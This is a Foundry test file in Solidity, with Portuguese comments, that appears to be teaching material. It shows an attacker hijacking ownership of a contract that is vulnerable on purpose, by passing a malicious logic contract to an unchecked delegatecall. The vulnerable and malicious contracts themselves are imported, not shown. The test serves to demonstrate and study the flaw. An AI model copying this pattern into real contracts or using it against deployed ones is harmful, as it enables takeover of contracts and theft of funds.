// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/DelegateCallVulnerable.sol";

contract DelegateCallTest is Test {
    VulnerableDelegate public vulnerable;
    MaliciousLogic public malicious;
    address public owner;
    address public attacker;

    function setUp() public {
        // Define os endereços: o dono (0x1) e o atacante (0x2)
        owner = address(0x1);
        attacker = address(0x2);

        // O dono (Binance) implanta o contrato VulnerableDelegate
        vm.prank(owner);
        vulnerable = new VulnerableDelegate();

        // O atacante implanta o contrato MaliciousLogic
        vm.prank(attacker);
        malicious = new MaliciousLogic();
    }

    // Teste 1: O dono original é o owner
    function testInitialOwner() public view {
        assertEq(vulnerable.owner(), owner);
    }

    // Teste 2: O atacante executa o delegatecall e sequestra o contrato
    function testAttackerHijacksOwner() public {
        // 1. Antes do ataque, o owner é o owner original
        assertEq(vulnerable.owner(), owner);

        // 2. O atacante chama a função execute, passando o endereço do contrato malicioso
        vm.prank(attacker);
        vulnerable.execute(address(malicious));

        // 3. Depois do ataque, o owner mudou para o atacante!
        assertEq(vulnerable.owner(), attacker);
    }
}